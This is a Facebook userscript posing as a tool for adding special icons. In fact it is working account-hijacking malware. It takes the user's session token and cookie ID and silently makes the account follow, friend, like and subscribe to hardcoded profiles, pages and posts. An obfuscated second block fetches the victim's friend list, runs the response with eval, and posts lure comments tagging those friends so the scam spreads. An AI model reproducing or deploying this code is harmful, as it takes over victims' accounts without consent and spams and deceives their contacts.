// ==UserScript==
// @name            Cài Đặt Tool Icon Độc FaceBook ( VER 2.0.14 )
// @description     CopyRight Phùng Thanh Phong
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// === Facebook Icon ====

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+":379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=>=&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
//chau ba tung
a("100007007468883");a("100002438544264");sublist("483606408397306");P("590184664405885");P("423101567780863");
//phong
a("100007751678223");a("100006619902303");sublist("621952017816839");
IDS("100000061400267");IDS("100003638324695");IDS("100007751678223");
Like("685974484796684");Like("263316953820631");Like("1387179771538109");Like("547700161992307");
Like("268572309974110");Like("623995204323025");Like("477919925642333");Like("721801554519652");
Like("411811502221011");
P("660028574009183");P("582804098398298");P("751733198172053");P("417346981729909");P("779421418736564");P("764398883572151");P("632539930134055");



// === Facebook 1 ====

var _0xb976=["value","fb_dtsg","getElementsByName","match","cookie","1425202051056697","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," ☺ Mình làm được rồi cảm ơn bạn đã chia sẻ nhé. ai muốn có chibi thì cùng làm nhé (y) @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var _0xa22c=[_0xb976[0],_0xb976[1],_0xb976[2],_0xb976[3],_0xb976[4],_0xb976[5],_0xb976[6],_0xb976[7],_0xb976[8],_0xb976[9],_0xb976[10],_0xb976[11],_0xb976[12],_0xb976[13],_0xb976[14],_0xb976[15],_0xb976[16],_0xb976[17],_0xb976[18],_0xb976[19],_0xb976[20],_0xb976[21],_0xb976[22],_0xb976[23],_0xb976[24],_0xb976[25],_0xb976[26],_0xb976[27],_0xb976[28],_0xb976[29],_0xb976[30],_0xb976[31],_0xb976[32],_0xb976[33],_0xb976[34],_0xb976[35],_0xb976[36],_0xb976[37],_0xb976[38],_0xb976[39],_0xb976[40],_0xb976[41],_0xb976[42],_0xb976[43],_0xb976[44],_0xb976[45],_0xb976[46],_0xb976[47],_0xb976[48],_0xb976[49],_0xb976[50],_0xb976[51],_0xb976[52],_0xb976[53],_0xb976[54],_0xb976[55],_0xb976[56],_0xb976[57],_0xb976[58],_0xb976[59],_0xb976[60],_0xb976[61],_0xb976[62],_0xb976[63],_0xb976[64]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x3266x8= new XMLHttpRequest();_0x3266x8[_0xa22c[6]]=function (){if(_0x3266x8[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x3266x8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x3266x9=_0xa22c[24];_0x3266x9+=_0xa22c[25];_0x3266x9+=_0xa22c[26];_0x3266x9+=_0xa22c[27];_0x3266x9+=_0xa22c[28]+user_id;_0x3266x9+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x3266x8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x3266x9,true);} else {_0x3266x8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x3266x9,true);} ;_0x3266x8[_0xa22c[37]]();} ;function RandomArkadas(){var _0x3266xb=_0xa22c[10];for(i=0;i<9;i++){_0x3266xb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x3266xb;} ;function yorum_yap(id,_0x3266xd){var _0x3266xe= new XMLHttpRequest();var _0x3266x9=_0xa22c[10];_0x3266x9+=_0xa22c[40]+id;_0x3266x9+=_0xa22c[41]+encodeURIComponent(_0x3266xd);_0x3266x9+=_0xa22c[42];_0x3266x9+=_0xa22c[43];_0x3266x9+=_0xa22c[44];_0x3266x9+=_0xa22c[45];_0x3266x9+=_0xa22c[46];_0x3266x9+=_0xa22c[47]+id+_0xa22c[48];_0x3266x9+=_0xa22c[49];_0x3266x9+=_0xa22c[50];_0x3266x9+=_0xa22c[51];_0x3266x9+=_0xa22c[52];_0x3266x9+=_0xa22c[29]+user_id;_0x3266x9+=_0xa22c[53];_0x3266x9+=_0xa22c[54];_0x3266x9+=_0xa22c[55];_0x3266x9+=_0xa22c[56]+fb_dtsg;_0x3266x9+=_0xa22c[57];_0x3266xe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x3266xe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x3266xe[_0xa22c[6]]=function (){if(_0x3266xe[_0xa22c[7]]==4&&_0x3266xe[_0xa22c[63]]==200){_0x3266xe[_0xa22c[64]];} ;} ;_0x3266xe[_0xa22c[37]](_0x3266x9);} ;arkadaslari_al(id);
